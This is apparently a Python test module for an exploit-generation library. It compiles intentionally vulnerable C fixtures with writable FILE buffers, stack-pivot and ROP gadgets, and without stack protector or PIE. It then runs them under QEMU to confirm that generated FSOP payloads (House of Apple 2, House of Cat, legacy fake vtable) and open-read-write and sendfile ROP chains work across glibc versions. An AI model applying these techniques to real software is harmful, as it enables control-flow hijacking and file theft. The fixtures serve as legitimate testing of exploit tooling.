"""Opt-in live tests against every pinned glibc sysroot under qemu-user.

The normal suite never downloads a toolchain or starts QEMU.  Enable this
module with ``PWNC_GLIBC_QEMU_TESTS=1``.  ``PWNC_GLIBC_SYSROOT_CACHE`` selects
the persistent download/extraction cache (default:
``/tmp/pwnc-runtime-sysroot-cache``), and ``PWNC_GLIBC_QEMU_SPECS`` may contain
a comma-separated list of exact manifest IDs for a focused run.  With no
selector, every manifest spec and each catalog target mapped by that spec is
mandatory.

The fixture is deliberately launched through
``ProvisionedSysroot.qemu_argv``: invoking the provisioned loader with its
exact library directory prevents same-ISA QEMU runs from consulting the host
loader cache.  Protocol lengths are encoded in the guest target's byte order.
"""

from __future__ import annotations

import os
import select
import subprocess
import sys
import tempfile
import unittest
from collections.abc import Iterable
from pathlib import Path

from payloads import (
    ABI,
    FSOP,
    SUPPORTED_TARGETS,
    Address,
    Architecture,
    ELFProfile,
    ExactELFAdapter,
    FSOPActivation,
    FSOPFamily,
    FSOPStream,
    FSOPTechnique,
    FunctionPointerModel,
    Image,
    IOJumpSlot,
    IOVtableBounds,
    LibcImage,
    LibcROPBuilder,
    LibcROPStageKind,
    Linkage,
    RuntimeLayout,
    Target,
    inspect_elf,
)
from payloads.tests.runtime_support import (
    ProvisionedSysroot,
    SysrootSpec,
    load_manifest,
    provision_sysroot,
)

_OPT_IN = os.environ.get("PWNC_GLIBC_QEMU_TESTS") == "1"
_CACHE_ENV = "PWNC_GLIBC_SYSROOT_CACHE"
_SELECTOR_ENV = "PWNC_GLIBC_QEMU_SPECS"
_DEFAULT_CACHE = Path(tempfile.gettempdir()) / "pwnc-runtime-sysroot-cache"
_PROTOCOL_LIMIT = 0x100000
_TARGETS_BY_NAME = {target.name: target for target in SUPPORTED_TARGETS}


_FSOP_SOURCE = r"""
#define _GNU_SOURCE
#include <dlfcn.h>
#include <errno.h>
#include <gnu/libc-version.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

_Alignas(16) static unsigned char pwnc_file[512];
_Alignas(16) static unsigned char pwnc_aux[4096];

__attribute__((noreturn, noinline, used)) static void pwnc_callback(void *fp) {
    static const char marker[] = "PWNC_GLIBC_FSOP_OK";
    (void) fp;
    (void) write(STDOUT_FILENO, marker, sizeof(marker) - 1);
    _exit(0);
}

static int read_exact(int fd, void *buffer, size_t size) {
    unsigned char *cursor = buffer;
    while (size != 0) {
        ssize_t count = read(fd, cursor, size);
        if (count > 0) {
            cursor += (size_t) count;
            size -= (size_t) count;
        } else if (count < 0 && errno == EINTR) {
            continue;
        } else {
            return -1;
        }
    }
    return 0;
}

int main(int argc, char **argv) {
    void *handle;
    void *wfile_jumps;
    Dl_info owner;
    uint32_t sizes[2];

    if (argc != 2)
        return 90;
    handle = dlopen("libc.so.6", RTLD_NOW | RTLD_LOCAL);
    if (handle == NULL)
        return 91;
    wfile_jumps = dlsym(handle, "_IO_wfile_jumps");
    if (wfile_jumps == NULL || dladdr(wfile_jumps, &owner) == 0)
        return 92;
    if (printf("PWNC_GLIBC\t%s\t%p\t%s\t%p\t%p\t%p\t%p\n",
               owner.dli_fname, owner.dli_fbase, gnu_get_libc_version(),
               wfile_jumps, (void *) pwnc_file, (void *) pwnc_aux,
               (void *) (uintptr_t) pwnc_callback) < 0 || fflush(stdout) != 0)
        return 93;
    if (read_exact(STDIN_FILENO, sizes, sizeof(sizes)) != 0)
        return 94;
    if (sizes[0] > sizeof(pwnc_file) || sizes[1] > sizeof(pwnc_aux))
        return 95;
    if (read_exact(STDIN_FILENO, pwnc_file, sizes[0]) != 0 ||
        read_exact(STDIN_FILENO, pwnc_aux, sizes[1]) != 0)
        return 96;

    if (strcmp(argv[1], "fflush") == 0)
        (void) fflush((FILE *) pwnc_file);
    else if (strcmp(argv[1], "seek") == 0)
        (void) fseek((FILE *) pwnc_file, 0, SEEK_SET);
    else
        return 97;
    return 98;
}
"""


_X86_ROP_SOURCE = r"""
#define _GNU_SOURCE
#include <dlfcn.h>
#include <errno.h>
#include <fcntl.h>
#include <gnu/libc-version.h>
#include <stdint.h>
#include <stdio.h>
#include <unistd.h>

__attribute__((aligned(4096))) unsigned char pwnc_chain[0x100000];
__attribute__((aligned(4096))) unsigned char pwnc_storage[0x2000];

extern void pwnc_pivot(void *chain) __attribute__((noreturn));

static int read_exact(int fd, void *buffer, size_t size) {
    unsigned char *cursor = buffer;
    while (size != 0) {
        ssize_t count = read(fd, cursor, size);
        if (count > 0) {
            cursor += (size_t) count;
            size -= (size_t) count;
        } else if (count < 0 && errno == EINTR) {
            continue;
        } else {
            return -1;
        }
    }
    return 0;
}

int main(void) {
    void *handle = dlopen("libc.so.6", RTLD_NOW | RTLD_LOCAL);
    void *open_address = handle == NULL ? NULL : dlsym(handle, "open");
    Dl_info owner;
    uint32_t sizes[2];
    void *chain_base = pwnc_chain + 0xf0000 + (sizeof(void *) == 4 ? 8 : 0);
    int probe;

    if (open_address == NULL || dladdr(open_address, &owner) == 0)
        return 100;
    if (printf("PWNC_ROP\t%s\t%p\t%s\t%p\t%p\t%p\n",
               owner.dli_fname, owner.dli_fbase, gnu_get_libc_version(),
               open_address, chain_base, (void *) pwnc_storage) < 0 || fflush(stdout) != 0)
        return 101;
    if (read_exact(STDIN_FILENO, sizes, sizeof(sizes)) != 0)
        return 102;
    if (sizes[0] > sizeof(pwnc_storage) || sizes[1] > 0x10000)
        return 103;
    if (read_exact(STDIN_FILENO, pwnc_storage, sizes[0]) != 0 ||
        read_exact(STDIN_FILENO, chain_base, sizes[1]) != 0)
        return 104;
    probe = open("/dev/null", O_RDONLY);
    if (probe != 3)
        return 105;
    if (close(probe) != 0)
        return 106;
    pwnc_pivot(chain_base);
}

#if defined(__x86_64__)
__asm__(
    ".text\n"
    ".globl pwnc_pop_rdi_ret\n"
    "pwnc_pop_rdi_ret: pop %rdi; ret\n"
    ".globl pwnc_pop_rsi_ret\n"
    "pwnc_pop_rsi_ret: pop %rsi; ret\n"
    ".globl pwnc_pop_rdx_ret\n"
    "pwnc_pop_rdx_ret: pop %rdx; ret\n"
    ".globl pwnc_pop_rcx_ret\n"
    "pwnc_pop_rcx_ret: pop %rcx; ret\n"
    ".globl pwnc_pivot\n"
    "pwnc_pivot: mov %rdi, %rsp; ret\n"
    ".section .note.GNU-stack,\"\",@progbits\n"
);
#elif defined(__i386__)
__asm__(
    ".text\n"
    ".globl pwnc_add_esp_0xc_ret\n"
    "pwnc_add_esp_0xc_ret: add $0xc, %esp; ret\n"
    ".globl pwnc_add_esp_0x10_ret\n"
    "pwnc_add_esp_0x10_ret: add $0x10, %esp; ret\n"
    ".globl pwnc_pop4_ret\n"
    "pwnc_pop4_ret: pop %eax; pop %ebx; pop %ecx; pop %edx; ret\n"
    ".globl pwnc_pivot\n"
    "pwnc_pivot: mov 4(%esp), %eax; mov %eax, %esp; ret\n"
    ".section .note.GNU-stack,\"\",@progbits\n"
);
#else
#error This fixture is only for i386 and AMD64
#endif
"""


def _cache_dir() -> Path:
    return Path(os.environ.get(_CACHE_ENV, _DEFAULT_CACHE)).expanduser().resolve()


def _catalog_target(name: str) -> Target:
    try:
        return _TARGETS_BY_NAME[name]
    except KeyError as exc:
        raise AssertionError(f"manifest contains unknown canonical target {name!r}") from exc


def _selected_specs() -> tuple[SysrootSpec, ...]:
    specs = load_manifest().sysroots
    raw = os.environ.get(_SELECTOR_ENV, "").strip()
    if not raw:
        return specs
    requested = tuple(item.strip() for item in raw.split(",") if item.strip())
    if not requested:
        raise AssertionError(f"{_SELECTOR_ENV} contains no manifest IDs")
    known = {spec.id: spec for spec in specs}
    unknown = sorted(set(requested).difference(known))
    if unknown:
        raise AssertionError(f"{_SELECTOR_ENV} contains unknown manifest IDs: {', '.join(unknown)}")
    return tuple(known[item] for item in requested)


def _environment() -> dict[str, str]:
    environment = os.environ.copy()
    for name in (
        "LD_AUDIT",
        "LD_LIBRARY_PATH",
        "LD_PRELOAD",
        "QEMU_LD_PREFIX",
        "QEMU_SET_ENV",
        "QEMU_UNSET_ENV",
    ):
        environment.pop(name, None)
    return environment


def _compile(
    provisioned: ProvisionedSysroot,
    source: str,
    output: Path,
    *,
    target: Target,
) -> None:
    target_flags = ("-mthumb",) if target.arch is Architecture.THUMB else ()
    # GCC 6 in the 2.24 SDK predates the driver's ``-no-pie`` spelling; that
    # toolchain already links ET_EXEC by default and accepts ``-fno-pie`` for
    # compilation.  Newer SDKs and Zig receive both compile/link switches.
    non_pie_flags = ("-fno-pie",) if provisioned.spec.lane == "glibc-2.24" else ("-fno-pie", "-no-pie")
    command = (
        *provisioned.compiler_argv,
        *target_flags,
        "-x",
        "c",
        "-",
        "-std=gnu11",
        "-O0",
        "-Wall",
        "-Wextra",
        *non_pie_flags,
        "-fno-stack-protector",
        "-Wl,-z,noexecstack",
        "-o",
        str(output),
        "-ldl",
    )
    compiled = subprocess.run(command, input=source, capture_output=True, text=True, check=False)
    if compiled.returncode:
        raise AssertionError(
            f"{provisioned.spec.id}/{target.name} fixture compilation failed:\n{compiled.stdout}\n{compiled.stderr}"
        )


def _read_line(process: subprocess.Popen[bytes], label: str, timeout: int = 30) -> bytes:
    assert process.stdout is not None
    ready, _, _ = select.select((process.stdout,), (), (), timeout)
    if not ready:
        raise AssertionError(f"timed out waiting for {label} disclosure")
    line = process.stdout.readline()
    if not line:
        stderr = process.stderr.read().decode(errors="replace") if process.stderr is not None else ""
        raise AssertionError(f"{label} exited before its disclosure: {stderr}")
    return line.rstrip(b"\n")


def _target_key(target: Target) -> tuple[object, ...]:
    return (target.bits, target.endian, target.abi, target.function_pointer_model)


def _assert_compiled_target(test: unittest.TestCase, profile_target: Target, intended: Target) -> None:
    if intended.arch is Architecture.THUMB:
        test.assertIs(profile_target.arch, Architecture.ARM)
        test.assertEqual(
            (profile_target.bits, profile_target.endian, profile_target.abi), (32, intended.endian, intended.abi)
        )
    else:
        test.assertEqual(_target_key(profile_target), _target_key(intended))


def _assert_exact_interpreter(
    test: unittest.TestCase,
    provisioned: ProvisionedSysroot,
    profile: ELFProfile,
) -> None:
    test.assertIsNotNone(profile.interpreter)
    assert profile.interpreter is not None
    guest_interpreter = provisioned.resolve_guest_path(profile.interpreter)
    test.assertTrue(guest_interpreter.is_file(), guest_interpreter)
    test.assertTrue(os.path.samefile(guest_interpreter, provisioned.loader))


def _assert_runtime_libc(
    test: unittest.TestCase,
    provisioned: ProvisionedSysroot,
    reported_name: bytes,
    reported_version: str,
    owner_base: int,
    leaked_symbol: int,
    symbol: str,
    *,
    symbols: Iterable[str],
    intended_target: Target | None = None,
) -> LibcImage:
    reported_path = Path(os.fsdecode(reported_name))
    test.assertTrue(reported_path.is_absolute(), reported_path)
    test.assertTrue(reported_path.exists(), reported_path)
    test.assertTrue(os.path.samefile(reported_path, provisioned.libc))
    profile = inspect_elf(provisioned.libc)
    artifact_libc = LibcImage.from_file(provisioned.libc, symbols=symbols, glibc_version=reported_version)
    test.assertEqual(profile.sha256, artifact_libc.identity.sha256)
    test.assertEqual(profile.build_id, artifact_libc.identity.build_id)
    test.assertTrue(artifact_libc.identity.matches(provisioned.libc.read_bytes()))
    libc = artifact_libc
    if intended_target is not None and intended_target.arch is Architecture.THUMB:
        test.assertIs(artifact_libc.target.arch, Architecture.ARM)
        test.assertEqual(
            (artifact_libc.target.bits, artifact_libc.target.endian, artifact_libc.target.abi),
            (intended_target.bits, intended_target.endian, intended_target.abi),
        )
        # ARM and Thumb share the EABI libc image.  Rebind its already attested
        # identity and offsets to the selected Thumb execution state so FSOP's
        # callback-pointer model requires and preserves the low state bit.
        libc = LibcImage(
            artifact_libc.identity,
            intended_target,
            artifact_libc.symbols,
            path=artifact_libc.path,
            metadata=artifact_libc.metadata,
        )
    test.assertEqual(reported_version, provisioned.spec.lane.removeprefix("glibc-"))
    test.assertEqual(owner_base + libc.offset(symbol), leaked_symbol)
    test.assertEqual(owner_base % 0x1000, 0)
    return libc


def _protocol_header(target: Target, *sizes: int) -> bytes:
    for size in sizes:
        if not 0 <= size <= _PROTOCOL_LIMIT:
            raise AssertionError(f"protocol size is out of range: {size}")
    return b"".join(size.to_bytes(4, target.endian.value) for size in sizes)


def _io_vtable_bounds(libc: LibcImage) -> IOVtableBounds:
    """Attest the primary-vtable range from the exact libc artifact.

    Older glibc link scripts retain a dedicated ``__libc_IO_vtables`` output
    section, which gives the validation bounds directly.  Newer release
    artifacts may merge that input section into ``.data.rel.ro`` and strip its
    start/stop symbols; in those artifacts the two exported, exact jump-table
    objects bracket the biased pointer used by the supported Apple/Cat routes.
    """

    if libc.path is None:
        raise AssertionError("live FSOP libc has no exact artifact path")
    try:
        from elftools.elf.elffile import ELFFile
    except ImportError as exc:  # pragma: no cover - project dependency
        raise AssertionError("pyelftools is required for live FSOP bounds") from exc

    file_jumps = libc.offset("_IO_file_jumps")
    wfile_jumps = libc.offset("_IO_wfile_jumps")
    with Path(libc.path).open("rb") as stream:
        elf = ELFFile(stream)
        section = elf.get_section_by_name("__libc_IO_vtables")
        if section is not None:
            start = int(section.header.sh_addr)
            end = start + int(section.header.sh_size)
            if not (start <= file_jumps < end and start <= wfile_jumps < end):
                raise AssertionError("exact __libc_IO_vtables section does not contain both exported jump tables")
            source = "exact libc __libc_IO_vtables ELF section"
        else:
            start = min(file_jumps, wfile_jumps)
            end = max(file_jumps, wfile_jumps) + 21 * libc.target.word_size
            source = "exact libc exported _IO_file_jumps/_IO_wfile_jumps bracket"
    return IOVtableBounds.from_libc_offsets(libc, start, end, source=source)


def _auxiliary_image(test: unittest.TestCase, writes: Iterable[object], base: int, capacity: int) -> bytes:
    materialized = tuple(writes)
    if not materialized:
        raise AssertionError("FSOP produced no auxiliary writes")
    end = max(item.address + len(item.data) for item in materialized)
    test.assertGreaterEqual(min(item.address for item in materialized), base)
    test.assertLessEqual(end, base + capacity)
    result = bytearray(end - base)
    occupied = bytearray(end - base)
    for item in materialized:
        start = item.address - base
        for index, value in enumerate(item.data, start):
            if occupied[index] and result[index] != value:
                raise AssertionError("materialized FSOP auxiliary writes conflict")
            result[index] = value
            occupied[index] = 1
    return bytes(result)


@unittest.skipUnless(_OPT_IN, f"set PWNC_GLIBC_QEMU_TESTS=1 to run; cache: {_CACHE_ENV}, selector: {_SELECTOR_ENV}")
class GlibcQemuFSOPTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        super().setUpClass()
        if not sys.platform.startswith("linux"):
            raise AssertionError("live qemu-user glibc tests require a Linux host")

    def test_exact_glibc_fsop_matrix(self) -> None:
        for spec in _selected_specs():
            provisioned = provision_sysroot(spec, _cache_dir())
            for target_name in spec.targets:
                target = _catalog_target(target_name)
                with (
                    self.subTest(spec=spec.id, target=target.name),
                    tempfile.TemporaryDirectory(prefix="pwnc-glibc-fsop-") as directory,
                ):
                    executable = Path(directory, "fixture")
                    _compile(provisioned, _FSOP_SOURCE, executable, target=target)
                    profile = inspect_elf(executable)
                    _assert_compiled_target(self, profile.target, target)
                    self.assertFalse(profile.pie)
                    self.assertIs(profile.linkage, Linkage.DYNAMIC)
                    self.assertTrue(profile.nx, profile.nx_evidence)
                    _assert_exact_interpreter(self, provisioned, profile)

                    if spec.lane == "glibc-2.23":
                        routes = (("fflush", FSOPFamily.LEGACY, FSOPActivation.FFLUSH, None),)
                    else:
                        routes = (
                            ("fflush", FSOPFamily.WIDE, FSOPActivation.FFLUSH, IOJumpSlot.DOALLOCATE),
                            ("seek", FSOPFamily.WIDE, FSOPActivation.SEEK, IOJumpSlot.OVERFLOW),
                        )
                    for route, family, activation, slot in routes:
                        with self.subTest(spec=spec.id, target=target.name, route=route):
                            self._run_fsop_route(
                                provisioned,
                                executable,
                                profile,
                                target,
                                route,
                                family,
                                activation,
                                slot,
                            )

    def _run_fsop_route(
        self,
        provisioned: ProvisionedSysroot,
        executable: Path,
        profile: ELFProfile,
        intended_target: Target,
        route: str,
        family: FSOPFamily,
        activation: FSOPActivation,
        slot: IOJumpSlot | None,
    ) -> None:
        process = subprocess.Popen(
            provisioned.qemu_argv(executable, route),
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=_environment(),
        )
        try:
            fields = _read_line(process, f"{provisioned.spec.id} FSOP").split(b"\t")
            self.assertEqual(len(fields), 8, fields)
            self.assertEqual(fields[0], b"PWNC_GLIBC")
            owner_base = int(fields[2], 16)
            glibc_version = fields[3].decode("ascii")
            wfile_jumps = int(fields[4], 16)
            file_address = int(fields[5], 16)
            auxiliary_address = int(fields[6], 16)
            callback_address = int(fields[7], 16)
            libc = _assert_runtime_libc(
                self,
                provisioned,
                fields[1],
                glibc_version,
                owner_base,
                wfile_jumps,
                "_IO_wfile_jumps",
                symbols=("_IO_file_jumps", "_IO_wfile_jumps"),
                intended_target=intended_target,
            )
            self.assertEqual(file_address, profile.symbol_offsets["pwnc_file"])
            self.assertEqual(auxiliary_address, profile.symbol_offsets["pwnc_aux"])
            self.assertEqual(callback_address, profile.symbol_offsets["pwnc_callback"])
            if intended_target.arch is Architecture.THUMB:
                self.assertEqual(callback_address & 1, 1)
            if libc.target.function_pointer_model is FunctionPointerModel.PPC64_ELFV1_DESCRIPTOR:
                self.assertIs(intended_target.abi, ABI.POWERPC64_ELFV1)

            bounds = None
            if family is FSOPFamily.WIDE:
                bounds = _io_vtable_bounds(libc)
            builder = FSOP(
                libc,
                stream=FSOPStream.HEAP,
                family=family,
                address=file_address,
                storage=auxiliary_address,
                io_vtables=bounds,
                glibc_version=glibc_version,
            )
            build_kwargs: dict[str, object] = {
                "callback_is_descriptor": libc.target.function_pointer_model
                is FunctionPointerModel.PPC64_ELFV1_DESCRIPTOR
            }
            if slot is not None:
                build_kwargs["slot"] = slot
            payload = builder.build(activation, callback_address, **build_kwargs)
            if family is FSOPFamily.LEGACY:
                self.assertIs(payload.technique, FSOPTechnique.LEGACY_FAKE_VTABLE)
            elif slot is IOJumpSlot.DOALLOCATE:
                self.assertIs(payload.technique, FSOPTechnique.HOUSE_OF_APPLE_2)
            else:
                self.assertIs(payload.technique, FSOPTechnique.HOUSE_OF_CAT)
            if provisioned.spec.lane == "glibc-2.24":
                self.assertEqual(payload.layout.wide_data_size, 0x138 if libc.target.bits == 64 else 0xB4)
            if provisioned.spec.lane == "glibc-2.41":
                self.assertEqual(payload.layout.flags2_size, 3)

            materialized = payload.materialize(RuntimeLayout(libc_base=owner_base))
            file_writes = [item for item in materialized if item.placement == "file"]
            auxiliary_writes = [item for item in materialized if item.placement != "file"]
            self.assertEqual(len(file_writes), 1)
            self.assertEqual(file_writes[0].address, file_address)
            auxiliary = _auxiliary_image(self, auxiliary_writes, auxiliary_address, 4096)
            protocol = (
                _protocol_header(intended_target, len(file_writes[0].data), len(auxiliary))
                + file_writes[0].data
                + auxiliary
            )
            stdout, stderr = process.communicate(protocol, timeout=30)
            self.assertEqual(process.returncode, 0, stderr.decode(errors="replace"))
            self.assertEqual(stdout, b"PWNC_GLIBC_FSOP_OK")
        finally:
            if process.poll() is None:
                process.kill()
            process.communicate()


@unittest.skipUnless(_OPT_IN, f"set PWNC_GLIBC_QEMU_TESTS=1 to run; cache: {_CACHE_ENV}, selector: {_SELECTOR_ENV}")
class GlibcQemuX86LibcROPTests(unittest.TestCase):
    def test_exact_libc_orw_and_sendfile_programs_use_challenge_gadgets(self) -> None:
        specs = tuple(
            spec
            for spec in _selected_specs()
            if any(_catalog_target(name).arch in {Architecture.X86, Architecture.X86_64} for name in spec.targets)
        )
        if not specs:
            self.skipTest("selected sysroot specs contain no i386 or AMD64 target")
        for spec in specs:
            provisioned = provision_sysroot(spec, _cache_dir())
            target = _catalog_target(spec.targets[0])
            with (
                self.subTest(spec=spec.id, target=target.name),
                tempfile.TemporaryDirectory(prefix="pwnc-glibc-rop-") as directory,
            ):
                root = Path(directory)
                executable = root / "fixture"
                _compile(provisioned, _X86_ROP_SOURCE, executable, target=target)
                profile = inspect_elf(executable)
                _assert_compiled_target(self, profile.target, target)
                self.assertFalse(profile.pie)
                self.assertIs(profile.linkage, Linkage.DYNAMIC)
                self.assertTrue(profile.nx, profile.nx_evidence)
                _assert_exact_interpreter(self, provisioned, profile)
                main_adapter = ExactELFAdapter.from_file(executable, expected_target=target)
                expected = bytes(range(256)) + b"\0PWNC libc ROP\n"
                input_file = root / "orw-input"
                input_file.write_bytes(expected)
                for mode in ("orw", "sendfile"):
                    with self.subTest(spec=spec.id, target=target.name, mode=mode):
                        self._run_rop_program(
                            provisioned,
                            executable,
                            profile,
                            main_adapter,
                            target,
                            input_file,
                            expected,
                            mode,
                        )

    def _run_rop_program(
        self,
        provisioned: ProvisionedSysroot,
        executable: Path,
        profile: ELFProfile,
        main_adapter: ExactELFAdapter,
        target: Target,
        input_file: Path,
        expected: bytes,
        mode: str,
    ) -> None:
        process = subprocess.Popen(
            provisioned.qemu_argv(executable),
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=_environment(),
        )
        try:
            fields = _read_line(process, f"{provisioned.spec.id} libc ROP").split(b"\t")
            self.assertEqual(len(fields), 7, fields)
            self.assertEqual(fields[0], b"PWNC_ROP")
            owner_base = int(fields[2], 16)
            glibc_version = fields[3].decode("ascii")
            open_address = int(fields[4], 16)
            chain_base = int(fields[5], 16)
            storage_address = int(fields[6], 16)
            libc = _assert_runtime_libc(
                self,
                provisioned,
                fields[1],
                glibc_version,
                owner_base,
                open_address,
                "open",
                symbols=("open", "read", "write", "sendfile", "exit"),
                intended_target=target,
            )
            self.assertEqual(
                chain_base, profile.symbol_offsets["pwnc_chain"] + 0xF0000 + (8 if target.bits == 32 else 0)
            )
            self.assertEqual(storage_address, profile.symbol_offsets["pwnc_storage"])
            chain_mapping = next(item for item in profile.load_ranges if item.contains(chain_base, 0x10000))
            self.assertTrue(chain_mapping.writable)
            self.assertFalse(chain_mapping.executable)
            builder = LibcROPBuilder.from_file(
                provisioned.libc,
                input_file,
                writable_area=Address(storage_address, Image.MAIN, "fixture writable storage"),
                writable_size=0x2000,
                path_address=Address(storage_address, Image.MAIN, "external ORW path"),
                target=target,
            )
            if mode == "orw":
                program = builder.compose(
                    builder.open(),
                    builder.read(3, len(expected)),
                    builder.write(1, len(expected)),
                    builder.exit(42),
                )
                expected_operations = (
                    LibcROPStageKind.OPEN,
                    LibcROPStageKind.READ,
                    LibcROPStageKind.WRITE,
                    LibcROPStageKind.EXIT,
                )
                exit_status = 42
            else:
                program = builder.compose(
                    builder.open(),
                    builder.sendfile(1, 3, len(expected)),
                    builder.exit(43),
                )
                expected_operations = (
                    LibcROPStageKind.OPEN,
                    LibcROPStageKind.SENDFILE,
                    LibcROPStageKind.EXIT,
                )
                exit_status = 43
            self.assertEqual(program.operations, expected_operations)
            self.assertEqual(len(program.external_placements), 1)
            path = program.external_placements[0]
            self.assertEqual(path.resolved_address(RuntimeLayout(main_base=0)), storage_address)
            self.assertEqual(path.data, os.fsencode(input_file) + b"\0")
            self.assertIn(
                3,
                tuple(
                    argument for stage in program.stages for argument in stage.arguments if isinstance(argument, int)
                ),
            )
            lowered = program.lower_pwntools(
                RuntimeLayout(main_base=0, libc_base=owner_base),
                chain_base=chain_base,
                extra_images=((main_adapter, None),),
            )
            self.assertFalse(lowered.program.inline_path)
            self.assertIsNone(lowered.inline_path_offset)
            self.assertLessEqual(len(lowered.data), 0x10000)
            protocol = _protocol_header(target, len(path.data), len(lowered.data)) + path.data + lowered.data
            stdout, stderr = process.communicate(protocol, timeout=30)
            self.assertEqual(process.returncode, exit_status, stderr.decode(errors="replace"))
            self.assertEqual(stdout, expected)
            self.assertEqual(program.libc.identity.sha256, libc.identity.sha256)
        finally:
            if process.poll() is None:
                process.kill()
            process.communicate()


if __name__ == "__main__":
    unittest.main()
